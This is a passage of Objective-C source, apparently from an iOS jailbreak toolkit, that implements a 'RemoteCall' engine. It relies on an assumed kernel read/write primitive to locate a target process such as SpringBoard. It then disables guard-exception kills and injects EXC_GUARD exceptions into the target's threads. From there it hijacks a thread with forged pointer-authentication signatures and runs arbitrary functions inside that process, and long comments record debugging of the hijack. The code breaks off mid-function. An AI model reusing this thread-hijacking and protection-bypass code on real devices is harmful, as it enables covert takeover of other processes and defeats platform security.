bool remote_write_internal(uint64_t dst, const void *src, uint64_t size)
{
    if (g_RC_vphoneBridge)
        return rc_vphone_bridge_write(dst, src, size);

    if (!src || !dst || !size) return false;
    dst = native_strip(dst);

    uint64_t srcAddr = (uint64_t)(uintptr_t)src;
    uint64_t until   = dst + size;

    while (dst < until) {
        uint64_t remaining = until - dst;
        uint64_t offs      = dst & PAGE_MASK;
        uint64_t roundUp   = (dst + PAGE_SIZE) & ~PAGE_MASK;
        uint64_t copyCount = (roundUp - dst < remaining) ? (roundUp - dst) : remaining;
        uint64_t pageAddr  = dst & ~PAGE_MASK;

        struct VMShmem *page = get_shmem_for_page(pageAddr);
        if (!page) {
            printf("[%s:%d] remote_write failed: unable to find remote page\n", __FUNCTION__, __LINE__);
            return false;
        }

        memcpy((void *)(uintptr_t)(page->localAddress + offs), (const void *)(uintptr_t)srcAddr, (size_t)copyCount);
        dst     += copyCount;
        srcAddr += copyCount;
    }
    return true;
}

bool remote_write64(uint64_t dst, uint64_t val)
{
    return remote_write(dst, &val, sizeof(val));
}

bool remote_writeStr(uint64_t dst, const char *str)
{
    if (!str) return false;

    size_t len = strlen(str) + 1;
    return remote_write(dst, str, len);
}

uint64_t remote_call_trojan_mem(void)
{
    return g_RC_trojanMem;
}

uint64_t retry_first_thread(bool useMigFilterBypass) {
    if (useMigFilterBypass)
        mig_bypass_pause();

    sleep(1);

    if (useMigFilterBypass)
        mig_bypass_resume();

    return kread64(g_RC_taskAddr + off_task_threads_next);
}

static NSArray<NSNumber *> *collect_all_task_threads(uint64_t taskAddr) {
    NSMutableArray<NSNumber *> *list = [NSMutableArray new];
    if (!taskAddr || !is_kaddr_valid(taskAddr)) return list;
    uint64_t curr = kread64(taskAddr + off_task_threads_next);
    int count = 0;
    while (curr && is_kaddr_valid(curr) && count < 512) {
        [list addObject:@(curr)];
        curr = kread64(curr + off_thread_task_threads_next);
        count++;
    }
    return list;
}

// NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
int init_remote_call(const char* process, bool useMigFilterBypass) {
    clear_remote_shmem_cache();
    remote_call_note_init_failure(RemoteCallInitFailureNone, 0);
    g_RC_vphoneBridge = false;

    if (cyanide_vphone_debug_build() &&
        process && strcmp(process, "SpringBoard") == 0) {
        if (rc_vphone_bridge_ping()) {
            g_RC_vphoneBridge = true;
            g_RC_success = true;
            g_RC_creatingExtraThread = true;
            g_RC_pid = (int)rc_vphone_bridge_call(2, 0, "getpid",
                                                  0, 0, 0, 0, 0, 0, 0, 0);
            if (g_RC_pid <= 0) g_RC_pid = 1;
            printf("[VPHONE-BRIDGE] using SpringBoard bridge pid=%d\n", g_RC_pid);
            return 0;
        }
        printf("[VPHONE-BRIDGE] SpringBoard bridge unavailable; falling back to KRW RemoteCall\n");
    }

    if (!g_kexploit_ready) {
        printf("[%s:%d] KRW unavailable; refusing RemoteCall init for %s\n",
               __FUNCTION__, __LINE__, process);
        remote_call_note_init_failure(RemoteCallInitFailureKRWUnavailable, 0);
        return -1;
    }

    uint64_t procAddr;
    if (g_RC_targetProcOverride) {
        procAddr = g_RC_targetProcOverride;
        g_RC_targetProcOverride = 0;
        printf("[%s:%d] using caller-supplied proc override for %s proc=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr);
    } else {
        procAddr = proc_find_by_name(process);
    }
    if (!procAddr || procAddr == (uint64_t)-1 || !is_kaddr_valid(procAddr + off_proc_p_pid)) {
        printf("[%s:%d] process not found or invalid: %s proc=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr);
        remote_call_note_init_failure(RemoteCallInitFailureProcessMissing, 0);
        return -1;
    }
    uint32_t targetPid = kread32(procAddr + off_proc_p_pid);
    printf("[RemoteCall] Found %s in kernel (pid=%u) — preparing EXC_GUARD thread hijack.\n", process, targetPid);
    RC_DEBUG("[%s:%d] process: %s, pid: %u\n", __FUNCTION__, __LINE__, process, targetPid);
    g_RC_taskAddr = proc_task(procAddr);
    if (!g_RC_taskAddr || !is_kaddr_valid(g_RC_taskAddr)) {
        printf("[%s:%d] invalid task for process %s proc=%#llx task=%#llx\n",
               __FUNCTION__, __LINE__, process, procAddr, g_RC_taskAddr);
        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
        return -1;
    }

    uint64_t selfTask = task_self();
    if (!selfTask || !is_kaddr_valid(selfTask)) {
        printf("[%s:%d] invalid self task while preparing %s RemoteCall task=%#llx\n",
               __FUNCTION__, __LINE__, process, selfTask);
        remote_call_note_init_failure(RemoteCallInitFailureInvalidTask, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] targetTask=%#llx selfTask=%#llx\n",
             __FUNCTION__, __LINE__, g_RC_taskAddr, selfTask);

    mach_port_t firstExceptionPort = create_exception_port();
    mach_port_t secondExceptionPort = create_exception_port();

    RC_DEBUG("[%s:%d] firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n", __FUNCTION__, __LINE__, firstExceptionPort, secondExceptionPort);

    if (!firstExceptionPort || !secondExceptionPort)
    {
        printf("[%s:%d] Couldn't create exception ports\n", __FUNCTION__, __LINE__);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureExceptionPort, targetPid);
        return -1;
    }

    // Make sure the task won't crash after we handle an exception.
    if (disable_excguard_kill(g_RC_taskAddr) != 0) {
        printf("[%s:%d] failed to prepare task_exc_guard for %s task=%#llx\n",
               __FUNCTION__, __LINE__, process, g_RC_taskAddr);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureTaskGuard, targetPid);
        return -1;
    }

    mach_exception_code_t guardCode = 0;
    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);  // ??? what is 0xf503 value meaning?

    uint64_t firstPortAddr = task_get_ipc_port_kobject(selfTask, firstExceptionPort);
    uint64_t secondPortAddr = task_get_ipc_port_kobject(selfTask, secondExceptionPort);
    if (!firstPortAddr || !secondPortAddr)
        RC_DEBUG("[%s:%d] exception port kobjects first=%#llx second=%#llx (receive ports may have no kobject)\n",
                 __FUNCTION__, __LINE__, firstPortAddr, secondPortAddr);

    pthread_t dummyThread = NULL;
    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
    if (!dummyFunc) {
        printf("[%s:%d] dlsym(getpid) failed while preparing dummy thread\n",
               __FUNCTION__, __LINE__);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] creating local dummy thread for RemoteCall bootstrap\n",
             __FUNCTION__, __LINE__);
    int dummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
    if (dummyErr != 0 || !dummyThread) {
        printf("[%s:%d] pthread_create_suspended_np(dummy) failed err=%d thread=%p\n",
               __FUNCTION__, __LINE__, dummyErr, dummyThread);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
    if (!dummyThreadMach) {
        printf("[%s:%d] pthread_mach_thread_np(dummy) returned null\n",
               __FUNCTION__, __LINE__);
        pthread_cancel(dummyThread);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadMach=0x%x\n",
             __FUNCTION__, __LINE__, dummyThreadMach);
    uint64_t dummyThreadAddr = task_get_ipc_port_kobject(selfTask, dummyThreadMach);
    if (!is_kaddr_valid(dummyThreadAddr)) {
        printf("[%s:%d] failed to resolve dummy thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, dummyThreadMach, dummyThreadAddr);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadAddr=%#llx\n",
             __FUNCTION__, __LINE__, dummyThreadAddr);
    uint64_t dummyThreadTro = kread64(dummyThreadAddr + off_thread_t_tro);
    if (!is_kaddr_valid(dummyThreadTro)) {
        printf("[%s:%d] dummy thread tro invalid %#llx\n",
               __FUNCTION__, __LINE__, dummyThreadTro);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    RC_DEBUG("[%s:%d] dummyThreadTro=%#llx\n",
             __FUNCTION__, __LINE__, dummyThreadTro);
    mach_port_t threadSelf = mach_thread_self();
    uint64_t selfThreadAddr = task_get_ipc_port_kobject(selfTask, threadSelf);
    if (!is_kaddr_valid(selfThreadAddr)) {
        printf("[%s:%d] failed to resolve self thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, threadSelf, selfThreadAddr);
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, dummyThreadMach);
        mach_port_deallocate(mach_task_self_, threadSelf);
        destroy_exception_port(firstExceptionPort);
        destroy_exception_port(secondExceptionPort);
        remote_call_note_init_failure(RemoteCallInitFailureLocalThread, targetPid);
        return -1;
    }
    uint32_t selfThreadCtid = kread32(selfThreadAddr + off_thread_ctid);
    RC_DEBUG("[%s:%d] selfThreadAddr=%#llx selfThreadCtid=%#x\n",
             __FUNCTION__, __LINE__, selfThreadAddr, selfThreadCtid);
    mach_port_deallocate(mach_task_self_, threadSelf);

    g_RC_creatingExtraThread = true;
    g_RC_firstExceptionPort = firstExceptionPort;
    g_RC_secondExceptionPort = secondExceptionPort;
    g_RC_firstExceptionPortAddr = firstPortAddr;
    g_RC_secondExceptionPortAddr = secondPortAddr;
    g_RC_dummyThread = dummyThread;
    g_RC_dummyThreadMach = dummyThreadMach;
    g_RC_dummyThreadAddr = dummyThreadAddr;
    g_RC_dummyThreadTro = dummyThreadTro;
    g_RC_selfThreadAddr = selfThreadAddr;
    g_RC_selfThreadCtid = selfThreadCtid;

    g_RC_threadList = [NSMutableArray new];

    int targetInjectedThreadCount = 2;
    RC_DEBUG("[%s:%d] Target injected threads: %d\n",
             __FUNCTION__, __LINE__, targetInjectedThreadCount);

    int retryCount = 0;
    int validThreadCount = 0;
    int successThreadCount = 0;
    uint64_t firstThread = kread64(g_RC_taskAddr + off_task_threads_next);
    if (!firstThread || !is_kaddr_valid(firstThread)) {
        printf("[%s:%d] invalid first thread for process %s task=%#llx firstThread=%#llx\n",
               __FUNCTION__, __LINE__, process, g_RC_taskAddr, firstThread);
        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
        destroy_remote_call();
        return -1;
    }
    uint64_t currThread = firstThread;

    g_RC_trojanThreadAddr = 0;

    if (useMigFilterBypass)
        mig_bypass_resume();

    while (successThreadCount < targetInjectedThreadCount && validThreadCount < 5 && retryCount < 3) {
        uint64_t task = thread_get_task(currThread);
        if (!task) {
            if (!validThreadCount) {
                printf("[%s:%d] failed on getting first thread at all, resetting\n", __FUNCTION__, __LINE__);
                firstThread = retry_first_thread(useMigFilterBypass);
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                break;
            }
        }

        if (task == g_RC_taskAddr) {
            if (!set_exception_port_on_thread(g_RC_firstExceptionPort, currThread, useMigFilterBypass)) {
                printf("[%s:%d] Set exception port on thread:0x%llx failed\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                if (!validThreadCount) {
                    printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                    firstThread = retry_first_thread(useMigFilterBypass);
                    currThread = firstThread;
                    retryCount++;
                    continue;
                }
            } else {
                // Inject a EXC_GUARD exception on this thread
                if (!inject_guard_exception(currThread, guardCode)) {
                    printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx failed, not injecting\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                    if (!validThreadCount) {
                        printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                        firstThread = retry_first_thread(useMigFilterBypass);
                        currThread = firstThread;
                        retryCount++;
                        continue;
                    }
                } else {
                    if (!g_RC_trojanThreadAddr)
                        g_RC_trojanThreadAddr = currThread;
                    successThreadCount++;
                    [g_RC_threadList addObject:@(currThread)];
                    RC_DIAG("inject[%d] thread=0x%llx trojan=0x%llx%s",
                            successThreadCount,
                            (unsigned long long)currThread,
                            (unsigned long long)g_RC_trojanThreadAddr,
                            (currThread == g_RC_trojanThreadAddr) ? " (signer)" : "");
                }
            }
            validThreadCount++;
            if (successThreadCount >= targetInjectedThreadCount) {
                break;
            }
        } else if (task && !validThreadCount) {
            printf("[%s:%d] Got weird tro on first thread, resetting\n", __FUNCTION__, __LINE__);
            firstThread = retry_first_thread(useMigFilterBypass);
            currThread = firstThread;
            retryCount++;
            continue;
        }

        uint64_t next = kread64(currThread + off_thread_task_threads_next);
        if (!next) {
            if (!validThreadCount) {
                printf("[%s:%d] Got empty next thread. Retry\n", __FUNCTION__, __LINE__);
                firstThread = retry_first_thread(useMigFilterBypass);
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                printf("[%s:%d] Break because of empty next thread\n", __FUNCTION__, __LINE__);
                break;
            }
        }
        currThread = next;
    }

    if(useMigFilterBypass)
        mig_bypass_pause();

    RC_DEBUG("[%s:%d] Valid threads: %d\n", __FUNCTION__, __LINE__, validThreadCount);
    RC_DEBUG("[%s:%d] Injected threads: %d\n", __FUNCTION__, __LINE__, successThreadCount);

    if (g_RC_threadList.count == 0) {
        printf("[%s:%d] Exception injection failed. Aborting.\n", __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
        abandon_remote_call();
        return -1;
    }
    NSLog(@"[RemoteCall] EXC_GUARD injected on %lu thread(s) — waiting for trap.",
          (unsigned long)g_RC_threadList.count);

    ExceptionMessage exc;
    int firstExceptionTimeoutMS = g_RC_firstExceptionTimeoutMS > 0 ? g_RC_firstExceptionTimeoutMS : 120000;
    RC_DEBUG("[%s:%d] First exception wait timeout=%dms\n",
             __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
    if(!wait_exception(firstExceptionPort, &exc, firstExceptionTimeoutMS, false)) {
        printf("[%s:%d] Failed to receive first exception within %dms\n",
               __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
        for (NSNumber *thread in g_RC_threadList) {
            clear_guard_exception(thread.unsignedLongLongValue);
        }
        remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
        abandon_remote_call();
        return -1;
    }

    NSLog(@"[RemoteCall] Thread trapped — hijacking execution inside %s.", process);
    memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
    RC_DIAG("trap1 process=%s firstThread=0x%llx trojan=0x%llx "
            "excPC=0x%llx excLR=0x%llx excSP=0x%llx flags=0x%x code=%llu/%llu injected=%lu",
            process,
            (unsigned long long)firstThread,
            (unsigned long long)g_RC_trojanThreadAddr,
            (unsigned long long)native_strip(exc.threadState.__pc),
            (unsigned long long)native_strip(exc.threadState.__lr),
            (unsigned long long)native_strip(exc.threadState.__sp),
            (unsigned)exc.threadState.__flags,
            (unsigned long long)exc.codeFirst,
            (unsigned long long)exc.codeSecond,
            (unsigned long)g_RC_threadList.count);
    for (NSUInteger ti = 0; ti < g_RC_threadList.count; ti++) {
        uint64_t t = g_RC_threadList[ti].unsignedLongLongValue;
        RC_DIAG("threadList[%lu]=0x%llx%s%s",
                (unsigned long)ti,
                (unsigned long long)t,
                (t == firstThread) ? " first" : "",
                (t == g_RC_trojanThreadAddr) ? " trojan" : "");
    }

    for (NSNumber *thread in g_RC_threadList) {
        clear_guard_exception(thread.unsignedLongLongValue);
    }
    RC_DEBUG("[%s:%d] Finish clearing EXC_GUARD from all other threads...\n", __FUNCTION__, __LINE__);

    ExceptionMessage exc2;
    int desiredTimeout = 1500;
    int drainHits = 0;
    while (wait_exception(firstExceptionPort, &exc2, desiredTimeout, false)) {
        drainHits++;
        RC_DIAG("pre-creator drain hit#%d PC=0x%llx LR=0x%llx",
                drainHits,
                (unsigned long long)native_strip(exc2.threadState.__pc),
                (unsigned long long)native_strip(exc2.threadState.__lr));
        reply_with_state(&exc2, &exc2.threadState);
    }
    RC_DIAG("pre-creator drain done hits=%d", drainHits);

    if (!g_RC_trojanThreadAddr)
        g_RC_trojanThreadAddr = firstThread;

    // The thread every call is parked on, and the target's main thread, are the
    // same thing unless the synthetic call thread is in use. Callers that have
    // to reason about "am I on the main thread already" need that fact, so keep
    // it rather than making them re-derive it from the thread list.
    g_RC_mainThreadAddr = firstThread;
    RC_DIAG("main thread 0x%llx trojan=0x%llx (equal=%d)",
            (unsigned long long)g_RC_mainThreadAddr,
            (unsigned long long)g_RC_trojanThreadAddr,
            g_RC_mainThreadAddr == g_RC_trojanThreadAddr);

    arm_thread_state64_internal newState = exc.threadState;
    if (!sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR)) {
        // Nothing has been replied yet at this point, so the target is still
        // parked in its exception and this is still a clean place to stop. The
        // caller sees a failed init and the session state is torn down by
        // destroy_remote_call on the way out.
        RC_DIAG("creator-park: sign_state failed, aborting init");
        g_RC_success = false;
        return -1;
    }
    RC_DIAG("creator-park signer=0x%llx signedPC=0x%llx signedLR=0x%llx flags=0x%x",
            (unsigned long long)g_RC_trojanThreadAddr,
            (unsigned long long)newState.__pc,
            (unsigned long long)newState.__lr,
            (unsigned)newState.__flags);
    reply_with_state(&exc, &newState);
    RC_DIAG("creator replied — next getpid must consume PC=0x101");

    // Cyanide TaskRop/RemoteCall.m: after creator reply there is NO wait/repark.
    // The 1500ms loop above is the PRE-creator drain (same as Cyanide). Post-reply
    // wait+repark (e2ef173) → SB WATCHDOG at PC=0x101; wait+reply-same (43e15a4)
    // → SIGBUS PC=0x201. Next do_remote_call_temp("getpid") must consume the
    // 0x101 trap directly. Fail paths use fail_after_creator_park (restore).

    if (g_RC_originalThreadOnly) {
        g_RC_creatingExtraThread = false;
        g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
        g_RC_pid = (int)targetPid;
        g_RC_success = true;
        RC_DEBUG("[%s:%d] Original-thread-only RemoteCall ready; skipping synthetic pthread\n",
             __FUNCTION__, __LINE__);
        return 0;
    }

    // Fl0rk @ 0x100e61ff8..004 / 0x100e60544..0x100e64dc4:
    //   out = (SP & 0x7fffffffff) - 0x100
    //   signed = remote_pac(trojan, 0x301, 0)
    //   pthread_create_suspended_np(out, 0, signed, 0)
    // 34c8d33 still *out=0 after dropping entry cache. Prior malloc out also
    // remapped OUR writes but not create's. Split the fault:
    //   canary DEAD via remote_write, then SB-side memcpy bounce to heap
    //   (heap remap known-good) so we see what SB's MMU sees at out.
    uint64_t trapSP = (uint64_t)exc.threadState.__sp & 0x7fffffffffULL;
    g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
    g_RC_success = true;

    // Where the pthread_t comes back to, and this is the fix: allocated in the
    // target, not carved out of the trojan thread's stack.
    //
    // It used to be SP - 0x100, taken from the stack pointer of the exception that
    // started all of this, on the reasoning that it is a scratch address. It is not
    // scratch, it is BELOW the stack pointer, and on a Darwin userspace thread that
    // is the guard gap: the range of the stack that is mapped PROT_NONE on purpose,
    // so that a push past the frame faults instead of quietly writing through
    // another frame. com.apple.main-thread is a pthread, so its stack has a guard,
    // so SP - 0x100 is inside it.
    //
    // The history of this line, read backwards, is the argument. An earlier version
    // saw *out come back 0 and concluded that OUR write was being remapped, then
    // split the fault by bouncing through the target heap "so we see what SB's MMU
    // sees at out". The heap bounce is the right instinct and it was applied to the
    // reading half while the writing half kept pointing into the guard.
    //
    // A measured session then produced three facts that have one cause between them:
    // the create returned 0, the out pointer read back 0, and no new thread appeared
    // in SpringBoard's thread list. A successful pthread_create cannot produce that.
    // A fault can produce all three. pthread_create writing its result to an unmapped
    // address faults; the fault arrives on the same exception port the transport is
    // already waiting on; the transport cannot tell a return from a fault and hands
    // back x0, which is 0; and no thread was ever created. The bounce then does a
    // memcpy from the same dead address, which faults too, so the buffer is still
    // holding the memset value, which is also 0. Every observation, one cause.
    //
    // malloc in the target is the same call the bounce already makes and already
    // trusts, and it puts both halves of the round trip on the same side of the
    // process boundary.
    uint64_t outBuf = 0;
    if (g_RC_success) {
        outBuf = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
        if (g_RC_success && outBuf) {
            do_remote_call_temp(100, "memset", outBuf, 0, 8, 0, 0, 0, 0, 0);
        }
    }
    RC_DIAG("out buffer: SP=0x%llx old=SP-0x100=0x%llx new=malloc=0x%llx vmMap=0x%llx",
            (unsigned long long)trapSP,
            (unsigned long long)(trapSP - 0x100ULL),
            (unsigned long long)outBuf,
            (unsigned long long)g_RC_vmMap);

    uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
    RC_DIAG("remote_pac(0x301,0)=0x%llx", (unsigned long long)remoteCrashSigned);

    RC_DIAG("bootstrap getpid begin");

    // The bootstrap getpid, retried. This is the one call that decides whether the
    // whole overlay exists: every call after it runs on the thread this one proves
    // can be driven at all, so a single miss here takes down the entire feature.
    //
    // It was also the only one-shot left in the bootstrap, and a one-shot on a mach
    // exception port is a bet that the fault is already queued at the instant we go
    // looking for it.
    //
    // The 100 is not 100 ms. do_remote_call_temp_internal raises every temp call to
    // the stable floor first, so this already waits 10 s, and a miss here is a full
    // ten second wait that came back empty rather than a call that was too slow.
    //
    // Retrying is the correct response to a miss rather than a patch over one,
    // because the port is a queue and a miss means the fault is late far more often
    // than it means the fault is absent. Nothing is replied on a miss, so whatever
    // was in flight is still queued and the next attempt consumes it. If it is the
    // second wait that missed, then the return fault is what is now sitting in the
    // queue, and driving the thread with getpid again from that state runs getpid
    // once more and traps in the same place, so the pair converges instead of
    // oscillating. Every attempt is self-contained: same port, same parked thread,
    // one more step along.
    //
    // Three attempts, not thirty. SpringBoard's main thread is parked at 0x101 for
    // the duration, so each attempt is more time the device runs without a main
    // thread, and a failure here is a failure of the whole feature rather than
    // something to grind on. The step that missed is printed unconditionally, once,
    // because the app's console is the only surface available when this fails and it
    // used to say nothing beyond the two hypotheses in the failure string.
    uint64_t bootstrapPid = 0;
    g_RC_bootstrapAttempts = 0;
    g_RC_bootstrapPid = 0;
    for (int attempt = 1; attempt <= 3; attempt++) {
        g_RC_success = true;   // do_remote_call_temp clears it; a retry starts clean
        g_RC_bootstrapAttempts = attempt;
        bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
        g_RC_bootstrapPid = bootstrapPid;
        RC_DIAG("bootstrap getpid attempt %d done pid=%llu success=%d step=%d",
                attempt, (unsigned long long)bootstrapPid,
                (int)g_RC_success, g_RC_lastTempStep);

        // Success is the mechanism. Not the pid.
        //
        // g_RC_lastTempStep is 0 when neither of the transport's two waits gave up,
        // and the transport only returns normally once both of them have completed.
        // The first one completing means the thread was parked at 0x101 and took the
        // fault. The second means it ran the function and took the fault on the way
        // back out, returning into 0x201. That is the whole of what this call is
        // for, and it is the only part of it that the two waits actually measure.
        //
        // The pid is not that, and asking for it was wrong twice over.
        //
        // It is discarded here. Further down, once the synthetic thread exists,
        // g_RC_pid is read properly with do_remote_call_stable and that is the value
        // the rest of the engine uses. Nothing between here and there looks at
        // bootstrapPid.
        //
        // And it is not free to demand. The engine carries a second copy of the same
        // rule inside the transport, a bare "if getpid returned 0, fail", which
        // clears g_RC_success on the way past and leaves the step unset. So the two
        // rules together made the entire overlay depend on a number this call was
        // never chartered to establish, and the sign that they had done it is
        // unambiguous once the step is measured: a failing session read
        // attempts=3, last=unclassified, pacTimeouts=0, which says no wait gave up,
        // the pacia signer was never late, and the call went out and came back with
        // zero. Every part of the engine was working, and the session was destroyed
        // over a return value that is thrown away.
        if (g_RC_lastTempStep == 0) {
            // Restored because the transport clears it for the reason above, and
            // every step after this one is guarded on it: the pthread create reads
            // "g_RC_success && createResult == 0", so leaving it false here would skip
            // the synthetic call thread and the session would limp on without one.
            g_RC_success = true;
            break;
        }
    }
    RC_DIAG("bootstrap getpid done pid=%llu success=%d step=%d",
            (unsigned long long)bootstrapPid, (int)g_RC_success, g_RC_lastTempStep);
    if (g_RC_lastTempStep != 0) {
        RC_DIAG("bootstrap getpid FAILED");
        fail_after_creator_park(RemoteCallInitFailureBootstrapGetpid, targetPid);
        return -1;
    }

    // IPS 17.5.1: pthread_create(start=unsigned sleep) -> new SB thread hits
    // sleep@libsystem_c with PAC fail -> CODESIGNING Invalid Page / SIGKILL.
    // 480f679/54b6d33 used that only because pthread_* are stubs on iOS 26.
    // On pre-26, suspended_np + stripped shared-cache getpid works (756f983);
    // thread stays suspended until we park 0x301 and resume.
    // On iOS 26+, skip create+sleep (PAC bomb if not actually stub) and reuse
    // inject thread[1] / originalThreadOnly.
    const uint64_t kCanary = 0xDEADBEEFCAFEBABEULL;
    const bool ios26StubPthread = SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"26.0");
    uint64_t callThreadPort = 0;
    bool createdSuspended = false;
    g_RC_createDead = false;
    g_RC_callThreadPath = "";

    if (!ios26StubPthread) {
        // The start routine is a real function, not a fake address.
        //
        // It was a signature over 0x301, on the theory that the kernel records the
        // start program counter as creation-time state and that the thread faults
        // there the moment it is released, which is the whole of the park. The
        // thread is never released until its state has been written from the outside
        // anyway, see the park below, so nothing runs the start routine, so making it
        // a fake address buys nothing and costs the one input the create cannot
        // cope with being wrong.
        //
        // The cost is measured. A create that faulted reported it as a return, and
        // x0 at the fault was 0x10, which is not a pointer and not an argument this
        // call was given: the thread was already looping on a fault by then, which
        // is what the transport did with a faulted state, now fixed separately.
        //
        // A real, stripped, shared cache function is what this file records as
        // working on a pre-26 target: "On pre-26, suspended_np + stripped
        // shared-cache getpid works (756f683)". That is the one line of this call
        // that has a measurement behind it, so it is the one that goes back to it.
        uint64_t startRoutine = native_strip((uint64_t)dlsym(RTLD_DEFAULT, "getpid"));
        const char *startKind = "stripped_getpid";
        if (!startRoutine || startRoutine == (uint64_t)-1) {
            g_RC_callThreadStep = 12;
            RC_DIAG("no start routine address — cannot create call thread");
            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
            return -1;
        }

        if (!outBuf) {
            g_RC_callThreadStep = 10;
            g_RC_createDead = true;
            RC_DIAG("no target out buffer for pthread_create_suspended_np — "
                    "abandoning the create, thread[1] reuse next");
        }

        NSArray<NSNumber *> *threadsBefore = collect_all_task_threads(g_RC_taskAddr);

        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=0x%llx (target malloc)",
                startKind, (unsigned long long)startRoutine,
                (unsigned long long)outBuf);

        uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
                                                    outBuf, 0, startRoutine, 0, 0, 0, 0, 0);

        // A return, or a fault, and the transport cannot tell them apart.
        //
        // do_remote_call_temp hands back x0 from whatever arrived on the port second,
        // and a bad-access fault raised inside the function arrives on that same port
        // with x0 holding whatever the function had loaded. It is then indistinguishable
        // from a return, and this is the line that cost a session: a pthread_create
        // that faulted instead of creating a thread reported a return value of 0,
        // which is exactly what a successful pthread_create reports.
        //
        // A real return is the thread executing the instruction it returned to, which
        // is the fake link register. That is the only PC that means "the function
        // ran to completion and went home". Anything else means it did not, and the
        // return value is a register the function never set, so nothing downstream
        // can be trusted.
        //
        // Checked here and nowhere else on purpose. This call is the one that
        // allocates memory, writes to a caller-supplied out pointer and has to come
        // back for the whole engine to mean anything, and it is the one that has
        // demonstrably been faulting. Making the check general would risk turning a
        // working path into a named failure over a PC that is merely unusual.
        if (g_RC_success &&
            native_strip(g_RC_lastTempRetPC) != FAKE_LR_TROJAN_CREATOR) {
            g_RC_callThreadStep = 11;
            RC_DIAG("create did not return: retPC=0x%llx expected=0x%llx (fault, not a "
                    "return) — abandoning the create, thread[1] reuse next",
                    (unsigned long long)native_strip(g_RC_lastTempRetPC),
                    (unsigned long long)FAKE_LR_TROJAN_CREATOR);
            g_RC_createDead = true;
        }
        uint64_t pthreadAddr = 0;
        uint64_t newThreadAddr = 0;
        if (g_RC_createDead) {
            createdSuspended = false;
        }
        if (g_RC_success && !g_RC_createDead && createResult == 0) {
            uint64_t heapBounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
            if (g_RC_success && heapBounce) {
                // Zero via SB memset — no KRW write to bounce (avoids shmem poison).
                do_remote_call_temp(100, "memset", heapBounce, 0, 8, 0, 0, 0, 0, 0);
                do_remote_call_temp(100, "memcpy", heapBounce, outBuf, 8, 0, 0, 0, 0, 0);
                clear_remote_shmem_cache();
                pthreadAddr = remote_read64(heapBounce);
                RC_DIAG("post-pthread out=0x%llx sb_via_bounce=0x%llx",
                        (unsigned long long)outBuf,
                        (unsigned long long)pthreadAddr);
                do_remote_call_temp(100, "free", heapBounce, 0, 0, 0, 0, 0, 0, 0);
            } else {
                clear_remote_shmem_cache();
                pthreadAddr = remote_read64(outBuf);
